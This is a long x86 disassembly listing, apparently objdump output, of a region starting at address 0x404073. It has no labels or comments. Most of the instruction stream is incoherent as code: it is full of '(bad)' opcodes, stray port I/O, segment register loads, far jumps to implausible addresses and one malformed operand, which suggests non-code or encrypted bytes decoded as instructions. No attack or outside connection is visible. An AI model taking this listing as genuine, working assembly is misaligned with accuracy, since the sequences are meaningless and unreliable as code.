  404073:	hlt    
  404074:	xchg   ebp,eax
  404075:	mov    ds:0x43a66d3a,eax
  40407a:	mov    edi,0x32e071f7
  40407f:	fild   DWORD PTR [edx+0x29]
  404082:	adc    al,0xf
  404084:	leave  
  404085:	shr    bh,1
  404087:	in     eax,dx
  404088:	cmp    cl,BYTE PTR [ecx+0x79]
  40408b:	cld    
  40408c:	mov    ebp,0x2469c17b
  404091:	push   esp
  404092:	out    0x83,al
  404094:	ins    DWORD PTR es:[edi],dx
  404095:	cwde   
  404096:	xor    DWORD PTR [esi],edi
  404098:	fist   WORD PTR [edi+0x1d]
  40409b:	jg     0x40411c
  40409d:	imul   ebp,DWORD PTR [edi-0x77],0xffffffac
  4040a1:	push   0x19115405
  4040a6:	mov    ecx,0xde8bbf27
  4040ab:	jmp    0x2209c0ad
  4040b0:	mov    WORD PTR [ecx],di
  4040b3:	or     BYTE PTR [eax-0x495e313d],al
  4040b9:	mov    ebp,0x9fd7ca4b
  4040be:	jg     0x404061
  4040c0:	stc    
  4040c1:	jo     0x404079
  4040c3:	sbb    eax,edx
  4040c5:	mov    ebp,0x310e1934
  4040ca:	fmul   DWORD PTR [ebx]
  4040cc:	je     0x4040ff
  4040ce:	mov    esi,0x4bea0cca
  4040d3:	fs lahf 
  4040d5:	dec    edi
  4040d6:	std    
  4040d7:	cmc    
  4040d8:	lods   eax,DWORD PTR ds:[esi]
  4040d9:	sbb    DWORD PTR [ecx+0x6c],ecx
  4040dc:	aas    
  4040dd:	inc    esp
  4040de:	or     al,0x8e
  4040e0:	and    ecx,DWORD PTR [ebx]
  4040e2:	out    dx,al
  4040e3:	into   
  4040e4:	mov    ss,esp
  4040e6:	rcl    edx,1
  4040e8:	jge    0x404092
  4040ea:	push   ecx
  4040eb:	mov    edx,0x8e04fb00
  4040f0:	sbb    eax,0x88d3674e
  4040f5:	std    
  4040f6:	or     al,0x56
  4040f8:	push   esi
  4040f9:	nop
  4040fa:	adc    eax,0x86ac5f27
  4040ff:	or     eax,0x8d6d84c0
  404104:	sub    al,0xf0
  404106:	mov    cl,0xce
  404108:	cmovns edi,DWORD PTR [edi+0x3a]
  40410c:	arpl   WORD PTR ds:0x7a9cc073,bx
  404112:	and    al,0xd5
  404114:	push   ebx
  404115:	out    0xb2,al
  404117:	les    esi,FWORD PTR [edi]
  404119:	xor    BYTE PTR [eax-0x663e6b46],bh
  40411f:	jb     0x40416c
  404121:	lock (bad) 
  404123:	shl    DWORD PTR [ebp-0x7e56cb73],cl
  404129:	jmp    0x532cba4
  40412e:	pop    edx
  40412f:	mov    edx,0x66b53771
  404134:	das    
  404135:	jmp    0x404147
  404137:	fmul   st(0),st
  404139:	loop   0x404168
  40413b:	add    ax,0x6731
  40413f:	push   ss
  404140:	(bad)  
  404141:	push   edi
  404142:	jnp    0xaf666152
  404148:	arpl   WORD PTR [eax],sp
  40414a:	lock fmul QWORD PTR [edi-0x2c4b750e]
  404151:	dec    ebx
  404152:	adc    eax,0xf9411939
  404157:	inc    ebx
  404158:	test   BYTE PTR [eax+esi*8+0x56],cl
  40415c:	aas    
  40415d:	or     al,0xec
  40415f:	sub    dl,BYTE PTR [ecx+0x682e9e46]
  404165:	inc    ecx
  404166:	rol    DWORD PTR [edi-0x67e5972d],1
  40416c:	aad    0x48
  40416e:	add    eax,0x35fbd004
  404173:	outs   dx,DWORD PTR ds:[esi]
  404174:	and    DWORD PTR [edx-0x304f81c0],edi
  40417a:	mov    bh,0x89
  40417c:	mov    esp,ebx
  40417e:	xchg   edx,eax
  40417f:	pop    ds
  404180:	xchg   ebx,eax
  404181:	mov    bh,0x44
  404183:	add    DWORD PTR [ecx-0xd552a9],esp
  404189:	add    DWORD PTR [ebx-0x150b8c24],ebp
  40418f:	jmp    0x2a14e20e
  404194:	icebp  
  404195:	pop    ebx
  404196:	and    edi,esi
  404198:	dec    esp
  404199:	cmc    
  40419a:	mov    ebx,0xdf0fff6f
  40419f:	pop    edx
  4041a0:	shl    ebx,0xa6
  4041a3:	pop    edx
  4041a4:	shl    BYTE PTR [edx],cl
  4041a6:	adc    ch,BYTE PTR [eax]
  4041a8:	xor    eax,0xbdcf4792
  4041ad:	add    ebp,esi
  4041af:	mov    ds:0x4da1402e,eax
  4041b4:	lods   al,BYTE PTR ds:[esi]
  4041b5:	rcl    DWORD PTR [esi-0x2d53fd90],0x8a
  4041bc:	jne    0x404182
  4041be:	out    dx,al
  4041bf:	inc    ecx
  4041c0:	imul   edx,DWORD PTR [ecx+eiz*2-0x3c],0xa425598d
  4041c8:	ds cwde 
  4041ca:	or     al,0xa4
  4041cc:	add    BYTE PTR [eax],ch
  4041ce:	push   edx
  4041cf:	mov    dl,0x4
  4041d1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d3:	sbb    esp,DWORD PTR [ebx-0x14]
  4041d6:	dec    esi
  4041d7:	lods   eax,DWORD PTR ds:[esi]
  4041d8:	jb     0x404256
  4041da:	fsub   QWORD PTR [esi]
  4041dc:	dec    esp
  4041dd:	xor    ch,BYTE PTR [edi+eax*8-0x61]
  4041e1:	push   edx
  4041e2:	push   ebx
  4041e3:	imul   eax,DWORD PTR [ecx+0x4e]
  4041e7:	popa   
  4041e8:	sahf   
  4041e9:	sbb    cl,dl
  4041eb:	inc    edx
  4041ec:	adc    eax,0x6061cae1
  4041f1:	push   cs
  4041f2:	rcr    BYTE PTR [edi+ebp*4],1
  4041f5:	and    dl,BYTE PTR [ecx-0x5a7903e9]
  4041fb:	je     0x404209
  4041fd:	jg     0x40419d
  4041ff:	push   edi
  404200:	pop    eax
  404201:	rcl    BYTE PTR [esi-0x30],0xdb
  404205:	or     dh,BYTE PTR [edx]
  404207:	jo     0x4041ed
  404209:	pusha  
  40420a:	jae    0x40421c
  40420c:	retf   0x1bf6
  40420f:	retf   
  404210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404211:	je     0x4041b5
  404213:	retf   0x2c7f
  404216:	push   ecx
  404217:	mov    al,ds:0xe5f0ff24
  40421c:	push   ds
  40421d:	test   eax,0xe31e690d
  404222:	fwait
  404223:	dec    eax
  404224:	adc    al,0xb9
  404226:	outs   dx,BYTE PTR ds:[esi]
  404227:	out    0x60,al
  404229:	(bad)  
  40422a:	pop    eax
  40422b:	call   0x9219c2b1
  404230:	scas   eax,DWORD PTR es:[edi]
  404231:	sub    esi,DWORD PTR [ebp+0x670e54e]
  404237:	in     eax,dx
  404238:	(bad)  
  404239:	in     eax,dx
  40423a:	ins    BYTE PTR es:[edi],dx
  40423b:	mov    ebp,edi
  40423d:	mov    ?,edi
  40423f:	adc    BYTE PTR [edi+0x51],bl
  404242:	pop    esp
  404243:	jno    0x4042af
  404245:	adc    eax,0xe7cd39e1
  40424a:	fst    DWORD PTR [eax+0x4bc760f5]
  404250:	fcomp  st(7)
  404252:	cdq    
  404253:	mov    cl,0x6f
  404255:	jmp    0xe35aa027
  40425a:	cmp    esp,DWORD PTR [ecx-0x4f5df8a0]
  404260:	dec    eax
  404261:	jae    0x404221
  404263:	jle    0x404237
  404265:	jp     0x404249
  404267:	pop    ebp
  404268:	pop    ebp
  404269:	int    0x95
  40426b:	push   ebp
  40426c:	fstp   QWORD PTR [edx]
  40426e:	nop
  40426f:	in     al,0x41
  404271:	ins    BYTE PTR es:[edi],dx
  404272:	jg     0x40428d
  404274:	mov    ch,BYTE PTR [ebp-0x1f961f60]
  40427a:	mov    DWORD PTR [edi],eax
  40427c:	aas    
  40427d:	cmp    al,0xd1
  40427f:	in     eax,dx
  404280:	push   0xffffff97
  404282:	imul   ebx,ebx,0x8
  404285:	fdiv   st,st(7)
  404287:	int    0x9c
  404289:	xchg   BYTE PTR [ebx-0x56],bh
  40428c:	adc    edi,DWORD PTR [edx+0x1f]
  40428f:	nop
  404290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404291:	out    dx,eax
  404292:	stc    
  404293:	popf   
  404294:	jl     0x404249
  404296:	inc    ebp
  404297:	inc    ebp
  404298:	mov    ch,0x5
  40429a:	(bad)  
  40429b:	test   al,0x64
  40429d:	test   DWORD PTR ds:0x6f0eed50,ecx
  4042a3:	repz sbb DWORD PTR [ebx],ecx
  4042a6:	jp     0x404270
  4042a8:	ss mov ebx,0xe371678a
  4042ae:	mov    cs:0x35a062e4,al
  4042b4:	sbb    DWORD PTR [esi],esi
  4042b6:	sbb    al,0xc8
  4042b8:	(bad)  
  4042ba:	push   ds
  4042bb:	mov    eax,ds:0x42f44cc
  4042c0:	sbb    DWORD PTR [edi+eiz*8],edi
  4042c3:	adc    BYTE PTR [ebx-0x69],al
  4042c6:	xchg   ebx,eax
  4042c7:	mov    BYTE PTR [eax-0x5e79533d],bl
  4042cd:	arpl   WORD PTR [eax-0x4f63132],bp
  4042d3:	shl    DWORD PTR [edi+ecx*2],0x69
  4042d7:	inc    edx
  4042d8:	push   ds
  4042d9:	sbb    DWORD PTR [ebp-0x6cae182],ecx
  4042df:	ds pop esi
  4042e1:	pushf  
  4042e2:	aaa    
  4042e3:	jecxz  0x404326
  4042e5:	leave  
  4042e6:	popa   
  4042e7:	add    BYTE PTR [ebp-0x68d9efcd],0xe1
  4042ee:	retf   0x771
  4042f1:	sub    BYTE PTR cs:[esi+eax*4-0x3b],bh
  4042f6:	stc    
  4042f7:	scas   al,BYTE PTR es:[edi]
  4042f8:	mov    bh,0xc4
  4042fa:	mov    eax,ds:0x9835e3a8
  4042ff:	leave  
  404300:	test   al,0x4d
  404302:	ja     0x40433a
  404304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404305:	xchg   ebp,eax
  404306:	push   ebp
  404307:	xor    DWORD PTR [eax+0x5dfb0814],esi
  40430d:	and    BYTE PTR [edi],0xdf
  404310:	mov    ds:0x785269a2,al
  404315:	rcl    BYTE PTR [edx],cl
  404317:	sbb    bl,BYTE PTR [ebx-0x70]
  40431a:	sbb    eax,0xa638a2ee
  40431f:	adc    esi,edi
  404321:	ss leave 
  404323:	cmp    eax,0x91359c50
  404328:	sub    edi,DWORD PTR [ebx-0x48]
  40432b:	adc    BYTE PTR [edi+0x1d606526],bl
  404331:	add    dl,BYTE PTR [edi]
  404333:	into   
  404334:	(bad)  
  404335:	add    al,ah
  404337:	call   0xba74f9e0
  40433c:	bound  eax,QWORD PTR [ebp-0x303406d1]
  404342:	aam    0x57
  404344:	pop    edi
  404345:	mov    ds:0x7a0fb51a,eax
  40434a:	mov    esi,DWORD PTR ds:0x10a5bae5
  404350:	or     al,0x67
  404352:	xor    al,BYTE PTR [edi+0x98ea9bd]
  404358:	dec    edx
  404359:	cwde   
  40435a:	lods   al,BYTE PTR ds:[esi]
  40435b:	test   BYTE PTR [edx-0x61],dh
  40435e:	sub    al,0x91
  404360:	mov    dh,0xca
  404362:	imul   edi,edi,0xfffffff2
  404365:	or     BYTE PTR [ebx+0x33],bl
  404368:	and    al,0x34
  40436a:	fmul   DWORD PTR [edi+0x1d]
  40436d:	xor    BYTE PTR [ebx],cl
  40436f:	cmp    ebp,DWORD PTR [eax+0x77]
  404372:	rcr    BYTE PTR [ebp-0x6b],0x4
  404376:	retf   0xecbc
  404379:	mov    dl,0x9f
  40437b:	fadd   QWORD PTR [ecx+0xe]
  40437e:	or     DWORD PTR [ecx+0x20b621b2],0x4da2a8b3
  404388:	aas    
  404389:	mov    ecx,0x7cd9aee4
  40438e:	xchg   DWORD PTR [eax+0x59056716],ebp
  404394:	xchg   DWORD PTR [ebp+0x41],ebp
  404397:	rol    BYTE PTR [eax+0x2c],1
  40439a:	leave  
  40439b:	dec    eax
  40439c:	pop    ss
  40439d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40439e:	push   0xffffffb1
  4043a0:	data16 out 0xef,al
  4043a3:	sub    bl,BYTE PTR [edx]
  4043a5:	enter  0x7aaf,0x81
  4043a9:	fidivr WORD PTR ds:0x973f9c15
  4043af:	ja     0x404430
  4043b1:	stc    
  4043b2:	mov    al,BYTE PTR [ebx+0x3b]
  4043b5:	xchg   esp,eax
  4043b6:	outs   dx,DWORD PTR ds:[esi]
  4043b7:	call   0xd7e5443
  4043bc:	push   edx
  4043bd:	and    BYTE PTR [ebp-0x53],ah
  4043c0:	outs   dx,BYTE PTR ds:[esi]
  4043c1:	mov    eax,edx
  4043c3:	aad    0x1e
  4043c5:	rcr    BYTE PTR [ecx],1
  4043c7:	mov    edi,0x7277b771
  4043cc:	cmp    ch,bl
  4043ce:	jbe    0x4043d3
  4043d0:	xchg   edx,eax
  4043d1:	(bad)  
  4043d3:	xchg   DWORD PTR [esp+edx*8],esp
  4043d6:	test   eax,0xa92a1948
  4043db:	and    BYTE PTR [ebx],ah
  4043dd:	add    esi,ebx
  4043df:	int    0x44
  4043e1:	push   edx
  4043e2:	adc    dl,BYTE PTR [esi+0x1783afc9]
  4043e8:	fisttp DWORD PTR [ebp-0x444ce220]
  4043ee:	out    dx,eax
  4043ef:	add    ecx,esi
  4043f1:	into   
  4043f2:	adc    dh,bh
  4043f4:	sub    dl,cl
  4043f6:	test   BYTE PTR [ecx-0x2e],ch
  4043f9:	jbe    0x4043e0
  4043fb:	shl    bh,0x2f
  4043fe:	add    BYTE PTR [eax-0x18b6ff08],ch
  404404:	push   ecx
  404405:	es xchg edx,eax
  404407:	inc    ecx
  404408:	lahf   
  404409:	cmc    
  40440a:	mov    cl,0x5f
  40440c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440d:	ds sub al,ah
  404410:	push   edi
  404411:	mov    esi,DWORD PTR [esp+esi*1+0x398a40ee]
  404418:	sbb    eax,0x9327dbd6
  40441d:	cwde   
  40441e:	lods   eax,DWORD PTR ds:[esi]
  40441f:	pushf  
  404420:	mov    al,ds:0x6ef2f368
  404425:	push   0xcf8a6300
  40442a:	mov    gs,WORD PTR [ebp+0x20f1872c]
  404430:	stos   BYTE PTR es:[edi],al
  404431:	cli    
  404432:	shl    DWORD PTR [ebx+ecx*4],1
  404435:	icebp  
  404436:	rcl    BYTE PTR [eax-0x38],1
  404439:	test   dl,dh
  40443b:	xor    ah,cl
  40443d:	lahf   
  40443e:	jecxz  0x4043e8
  404440:	sub    ebp,DWORD PTR [ebp-0x3d072baa]
  404446:	push   cs
  404447:	sbb    BYTE PTR fs:[ebp+0xdead593],0x76
  40444f:	push   0xd6d1eebf
  404454:	xchg   ebx,eax
  404455:	rcl    DWORD PTR [ebp-0x287726c],cl
  40445b:	lea    eax,[edi-0x56b8e29b]
  404461:	adc    al,0x8d
  404463:	mov    dl,0x6a
  404465:	push   cs
  404466:	loope  0x404482
  404468:	pop    ebx
  404469:	adc    ebx,esp
  40446b:	aas    
  40446c:	mov    dh,0xac
  40446e:	xchg   esp,eax
  40446f:	jl     0x4044d7
  404471:	ret    
  404472:	jmp    0x404430
  404474:	data16 in al,dx
  404476:	cli    
  404477:	pusha  
  404478:	clc    
  404479:	je     0x4044c7
  40447b:	(bad)  
  40447c:	xchg   edx,eax
  40447d:	lock jecxz 0x404462
  404480:	pusha  
  404481:	out    0x8b,al
  404483:	call   DWORD PTR ds:0x5948d505
  404489:	mov    ecx,0x3db6d8f8
  40448e:	shr    cl,0x70
  404491:	popa   
  404492:	cdq    
  404493:	inc    edi
  404494:	push   eax
  404495:	retf   0xb870
  404498:	fisttp QWORD PTR [edi]
  40449a:	xor    DWORD PTR [esi-0x1e],0xb2528fd7
  4044a1:	and    DWORD PTR [esi],edi
  4044a3:	in     eax,0x9b
  4044a5:	sub    al,0xa3
  4044a7:	fiadd  DWORD PTR [ebx]
  4044a9:	in     eax,dx
  4044aa:	push   cs
  4044ab:	pop    esi
  4044ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ad:	or     eax,DWORD PTR [edx+0x1]
  4044b0:	push   0xa2da9aeb
  4044b5:	loopne 0x40444e
  4044b7:	mov    esp,0x273d37c3
  4044bc:	outs   dx,DWORD PTR ds:[esi]
  4044bd:	rol    DWORD PTR [edx+0x6e],0x35
  4044c1:	jg     0x404514
  4044c3:	sahf   
  4044c4:	jns    0x40452a
  4044c6:	ror    bl,1
  4044c8:	push   ebx
  4044c9:	int3   
  4044ca:	xor    BYTE PTR [ebx+0x45],0x5d
  4044ce:	cld    
  4044cf:	aaa    
  4044d0:	inc    edi
  4044d1:	pop    ds
  4044d2:	and    DWORD PTR [esi+eiz*1-0x278f3ccb],eax
  4044d9:	and    eax,0x2c5bc537
  4044de:	sar    bl,1
  4044e0:	sub    BYTE PTR [ecx],ah
  4044e2:	arpl   cx,si
  4044e4:	or     al,BYTE PTR [esi-0x1b6761c0]
  4044ea:	ss pop edx
  4044ec:	jns    0x4044e6
  4044ee:	pop    edx
  4044ef:	lea    esp,[ebp+0x29e4414d]
  4044f5:	push   0x8966b5a6
  4044fa:	jle    0x404513
  4044fc:	icebp  
  4044fd:	ins    DWORD PTR es:[edi],dx
  4044fe:	push   esi
  4044ff:	mov    eax,0x8b6e646
  404504:	std    
  404505:	lahf   
  404506:	aas    
  404507:	mov    esp,0x2cdc7a75
  40450c:	mov    al,0x6c
  40450e:	or     DWORD PTR [esi+eax*8+0x14],esi
  404512:	and    BYTE PTR [edx],al
  404514:	ror    DWORD PTR [eax-0x3c],cl
  404517:	test   DWORD PTR [esi+0x6b7e446b],edi
  40451d:	cwde   
  40451e:	bsf    edi,DWORD PTR [ebp-0x35]
  404522:	cwde   
  404523:	sub    BYTE PTR [ebp+0x60],bl
  404526:	inc    ebp
  404527:	ss out dx,eax
  404529:	xchg   ecx,eax
  40452a:	pushf  
  40452b:	dec    esi
  40452c:	iret   
  40452d:	add    ah,BYTE PTR [esp+ebx*1-0x34b4e44c]
  404534:	mov    bh,0x14
  404536:	add    DWORD PTR [ecx+ebp*1-0x55],ecx
  40453a:	aaa    
  40453b:	out    dx,al
  40453c:	test   al,0x9e
  40453e:	push   edx
  40453f:	pop    ecx
  404540:	pop    esi
  404541:	retf   0xd5d7
  404544:	icebp  
  404545:	out    0x87,al
  404547:	nop    DWORD PTR [esp+edi*8-0x7d10b14e]
  40454f:	sbb    ah,0xef
  404552:	adc    DWORD PTR [ebp-0x53],eax
  404555:	and    ecx,DWORD PTR [eax-0x37]
  404558:	sub    DWORD PTR [ebx+0x1569b6cd],ebp
  40455e:	lds    ecx,FWORD PTR [edx]
  404560:	cdq    
  404561:	mov    al,ds:0x71f558f3
  404566:	shr    DWORD PTR [ebx+0x31],0xf8
  40456a:	addr16 add al,0xe8
  40456d:	xchg   ecx,eax
  40456e:	and    DWORD PTR [edi],ebx
  404570:	sbb    BYTE PTR ss:[edx],cl
  404573:	inc    edx
  404574:	push   0x65
  404576:	jo     0x4045ab
  404578:	push   edi
  404579:	sbb    cl,BYTE PTR [ecx]
  40457b:	xor    DWORD PTR [ecx],0xffffffc6
  40457e:	fistp  QWORD PTR [esi]
  404580:	sbb    BYTE PTR [ebp+0x73395ce0],dh
  404586:	cdq    
  404587:	cmp    esi,ebx
  404589:	push   ebp
  40458a:	clc    
  40458b:	pop    ecx
  40458c:	push   edi
  40458d:	rol    al,1
  40458f:	or     eax,0x3b0d9ec3
  404594:	jle    0x404607
  404596:	repz jne 0x404595
  404599:	inc    eax
  40459a:	add    DWORD PTR [edx],eax
  40459c:	jg     0x4045e3
  40459e:	imul   ecx,DWORD PTR [edx+edi*8-0x3ee5cb01],0x2dd39e84
  4045a9:	repz xor al,0xa4
  4045ac:	sahf   
  4045ad:	pop    edx
  4045ae:	stc    
  4045af:	test   eax,0x4b73603b
  4045b4:	test   eax,0x702abdb9
  4045b9:	imul   ebx,DWORD PTR [eax+0x2f],0xffffffb7
  4045bd:	sub    DWORD PTR [esi],0x7af7320c
  4045c3:	(bad)
  4045c6:	jle    0x4045ad
  4045c8:	push   ds
  4045c9:	outs   dx,DWORD PTR ds:[esi]
  4045ca:	out    0xa9,eax
  4045cc:	xchg   BYTE PTR [ebx+esi*2],bl
  4045cf:	push   0x6515c376
  4045d4:	inc    ebx
  4045d5:	xchg   esp,eax
  4045d6:	cs (bad) 
  4045d8:	jae    0x4045c5
  4045da:	jecxz  0x404638
  4045dc:	sub    al,0x8
  4045de:	rol    DWORD PTR [ebp+0x5e491044],1
  4045e4:	mov    ebp,cs
  4045e6:	jl     0x404576
  4045e8:	sub    DWORD PTR [ebp+0x17],esi
  4045eb:	pusha  
  4045ec:	push   es
  4045ed:	rcl    ch,cl
  4045ef:	(bad)  
  4045f1:	mov    al,ds:0x11ca7ee4
  4045f6:	pop    ds
  4045f7:	jg     0x40465d
  4045f9:	stc    
  4045fa:	xchg   DWORD PTR [eax],ecx
  4045fc:	out    0xce,al
  4045fe:	shr    cl,0x21
  404601:	(bad)  [edi+0x64a702cc]
  404607:	mov    dl,0x37
  404609:	scas   al,BYTE PTR es:[edi]
  40460a:	imul   eax,DWORD PTR [edx-0x3d980020],0x75
  404611:	mov    esp,0x116b5938
  404616:	aas    
  404617:	test   DWORD PTR [esp+eax*2-0x46913eb0],ebp
  40461e:	xor    eax,0xf9ba6e39
  404623:	add    cl,0x7e
  404626:	sbb    dl,BYTE PTR [edi+eiz*2+0x6b]
  40462a:	ins    BYTE PTR es:[edi],dx
  40462b:	outs   dx,BYTE PTR ds:[esi]
  40462c:	or     DWORD PTR [ecx],esp
  40462e:	cmp    ah,BYTE PTR [eax-0x79]
  404631:	fadd   st,st(3)
  404633:	pop    es
  404634:	or     eax,0xa4a185f1
  404639:	sbb    BYTE PTR [eax],bl
  40463b:	sbb    BYTE PTR [edi],bl
  40463d:	stos   BYTE PTR es:[edi],al
  40463e:	clc    
  40463f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404640:	scas   al,BYTE PTR es:[edi]
  404641:	push   0xffffffd4
  404643:	inc    ecx
  404644:	jmp    0x8931:0x460c90ca
  40464b:	mov    eax,ds:0x99e5f83e
  404650:	je     0x404652
  404652:	addr16 cdq 
  404654:	jp     0x404682
  404656:	ja     0x4046ab
  404658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404659:	test   DWORD PTR [ecx],ecx
  40465b:	js     0x404624
  40465d:	xor    BYTE PTR [ebp+0x486f8400],cl
  404663:	push   eax
  404664:	(bad)  
  404665:	mov    eax,0xb2a9b709
  40466a:	sar    DWORD PTR [ecx-0x65],0xc1
  40466e:	inc    esi
  40466f:	add    al,0x3f
  404671:	test   BYTE PTR ds:0xc059499a,0x6f
  404678:	mov    edi,0x1d73b955
  40467d:	cmp    al,0x2f
  40467f:	leave  
  404680:	and    eax,edi
  404682:	xor    DWORD PTR [edi],0x64059a28
  404688:	call   0xd92b9c56
  40468d:	cmp    ecx,ebp
  40468f:	enter  0xe5ec,0x57
  404693:	push   eax
  404694:	test   DWORD PTR [esi],0x33cc5be1
  40469a:	pop    es
  40469b:	dec    esi
  40469c:	mov    ecx,0xfd87f9d8
  4046a1:	sti    
  4046a2:	std    
  4046a3:	push   esp
  4046a4:	(bad)  
  4046a5:	in     eax,0x26
  4046a7:	mov    al,ds:0x41eccb97
  4046ac:	test   DWORD PTR [ecx+0x19],0xf845f31a
  4046b3:	(bad)  
  4046b4:	or     BYTE PTR ds:[edi-0x1a1dac55],bh
  4046bb:	gs shl BYTE PTR gs:[ecx],0x13
  4046c0:	dec    ecx
  4046c1:	enter  0x12ee,0xb9
  4046c5:	and    DWORD PTR [esi],edx
  4046c7:	cmp    al,0xd6
  4046c9:	loopne 0x4046b7
  4046cb:	push   ecx
  4046cc:	dec    eax
  4046cd:	lea    edi,[edi+0x7bc8c0f7]
  4046d3:	xchg   ebx,eax
  4046d4:	int    0xbf
  4046d6:	arpl   WORD PTR es:[ebx+0x303b2c98],sp
  4046dd:	pusha  
  4046de:	sahf   
  4046df:	and    BYTE PTR ds:0xa95b5b4e,al
  4046e5:	inc    ebp
  4046e6:	bound  ecx,QWORD PTR [ebx]
  4046e8:	imul   eax,ecx,0xdaac359e
  4046ee:	mov    ds:0xe25d6ae8,al
  4046f3:	retf   
  4046f4:	cmp    bh,BYTE PTR [edx+0x38ff723e]
  4046fa:	and    al,0xed
  4046fc:	(bad)  
  4046fd:	jb     0x404726
  4046ff:	sub    al,0x3e
  404702:	jp     0x4046a3
  404704:	fsubr  DWORD PTR [ebx]
  404706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404707:	test   eax,0x5e627672
  40470c:	aad    0x65
  40470e:	scas   al,BYTE PTR es:[edi]
  40470f:	inc    ebx
  404710:	jne    0x40477f
  404712:	test   eax,0xb12c71e5
  404717:	int3   
  404718:	in     eax,dx
  404719:	cmp    al,ch
  40471b:	mov    DWORD PTR [eax-0x74],eax
  40471e:	repnz out 0x31,eax
  404721:	pop    ds
  404722:	xor    DWORD PTR [edx-0x1b154340],0x48
  404729:	cmp    ebp,esi
  40472b:	adc    ecx,ebp
  40472d:	loope  0x404758
  40472f:	hlt    
  404730:	shl    ebp,0x45
  404733:	and    eax,0x7bd9d866
  404738:	or     BYTE PTR [ecx-0x462d02b6],dh
  40473e:	jmp    0x99caa996
  404743:	jae    0x404716
  404745:	pop    esp
  404746:	xchg   edx,eax
  404747:	mov    al,0x6b
  404749:	ret    0xd8f4
  40474c:	or     edi,DWORD PTR [edi]
  40474e:	push   ebx
  40474f:	or     al,0x25
  404751:	mov    eax,ds:0x90b53587
  404756:	pop    es
  404757:	dec    si
  404759:	sahf   
  40475a:	xchg   ecx,eax
  40475b:	shl    BYTE PTR [edx-0x1862ad0a],1
  404761:	es pop ecx
  404763:	push   cs
  404764:	dec    edi
  404765:	cmc    
  404766:	push   edi
  404767:	(bad)  
  404768:	push   eax
  404769:	pop    eax
  40476a:	or     BYTE PTR [ecx+0x3813a0f8],dh
  404770:	dec    esi
  404771:	xchg   edi,eax
  404772:	xchg   ecx,eax
  404773:	jl     0x404742
  404775:	dec    edi
  404776:	ficomp DWORD PTR [edi]
  404778:	scas   eax,DWORD PTR es:[edi]
  404779:	lods   al,BYTE PTR ds:[esi]
  40477a:	cdq    
  40477b:	mov    esp,0x8a196c8a
  404780:	push   0xffffffc2
  404782:	fld    QWORD PTR [ebp+0x650392b6]
  404788:	(bad)  
  404789:	mov    dl,0x72
  40478b:	cli    
  40478c:	jno    0x4047ef
  40478e:	stc    
  40478f:	outs   dx,DWORD PTR es:[esi]
  404791:	cld    
  404792:	add    eax,0x8cc03527
  404797:	pusha  
  404798:	jbe    0x404784
  40479a:	pop    esi
  40479b:	xchg   ebp,eax
  40479c:	dec    edi
  40479d:	(bad)  [esi]
  40479f:	test   ecx,esp
  4047a1:	or     al,ah
  4047a3:	and    esi,edi
  4047a5:	shl    edx,1
  4047a7:	fdiv   DWORD PTR [ebp+0x5b6998a3]
  4047ad:	test   BYTE PTR [edi+0x15],ah
  4047b0:	add    ecx,DWORD PTR ds:0xd451bfe6
  4047b6:	arpl   WORD PTR [edi+0xf],si
  4047b9:	addr16 mov eax,0xce48b6be
  4047bf:	adc    al,0x75
  4047c1:	iret   
  4047c2:	add    BYTE PTR [esi+0x76b75ec3],0x49
  4047c9:	arpl   WORD PTR [edx-0x10],sp
  4047cc:	or     eax,0xb7cde747
  4047d1:	test   eax,0xcc89f252
  4047d6:	lods   eax,DWORD PTR ds:[esi]
  4047d7:	mov    dl,0x10
  4047d9:	lds    ecx,FWORD PTR [esi-0x6a518673]
  4047df:	inc    esp
  4047e0:	test   DWORD PTR [edi+0x6c],ecx
  4047e3:	sbb    DWORD PTR [edx+0x4099b1c5],edi
  4047e9:	sub    DWORD PTR [ecx],edx
  4047eb:	int3   
  4047ec:	cmp    al,0x33
  4047ee:	aad    0xb6
  4047f0:	jno    0x40483c
  4047f2:	or     esp,edx
  4047f4:	dec    edi
  4047f5:	loop   0x40478f
  4047f7:	call   0xb7c2:0x32d750d2
  4047fe:	jne    0x404823
  404800:	adc    BYTE PTR [ecx+0x257c1044],bh
  404806:	fld    QWORD PTR [esi+0x46f814b6]
  40480c:	cmp    eax,0x21173152
  404811:	xor    dl,BYTE PTR [ebx+0x3d115b7c]
  404817:	popa   
  404818:	and    dl,BYTE PTR [edi-0x88d5720]
  40481e:	xchg   esi,eax
  40481f:	repnz push 0x6c
  404822:	imul   ebx,DWORD PTR [edx+0x3edd670],0xffffffef
  404829:	stos   DWORD PTR es:[edi],eax
  40482a:	adc    eax,0x9cf04bf3
  40482f:	clc    
  404830:	pop    edx
  404831:	sub    esp,edx
  404833:	jg     0x40482d
  404835:	add    al,BYTE PTR [esi-0x13]
  404838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404839:	(bad)  
  40483a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483b:	cdq    
  40483c:	ret    0x7022
  40483f:	(bad)  
  404840:	jecxz  0x4047f7
  404842:	(bad)  
  404843:	into   
  404844:	or     eax,0xaed6e2e2
  404849:	jle    0x404854
  40484b:	(bad)  
  40484c:	es xchg ecx,eax
  40484e:	cmp    BYTE PTR gs:[edx],bh
  404851:	xchg   ebp,eax
  404852:	mov    edx,0xfa93fed8
  404857:	mov    al,0xc9
  404859:	or     edx,edx
  40485b:	lds    eax,FWORD PTR ds:0xd1644397
  404861:	dec    ebp
  404862:	outs   dx,DWORD PTR ds:[esi]
  404863:	ds fwait
  404865:	pop    esp
  404866:	ja     0x40482b
  404868:	pop    ds
  404869:	call   0xb03bd3c8
  40486e:	retf   0xe9a1
  404871:	mov    cl,0xe3
  404873:	mov    esi,0x53716379
  404878:	jecxz  0x4048aa
  40487a:	sub    eax,0x228e4b4e
  40487f:	mov    dh,BYTE PTR [ebp+0x11f86f9e]
  404885:	ss push ebp
  404887:	push   ecx
  404888:	cld    
  404889:	push   edx
  40488a:	mov    ds:0x4faf47d,al
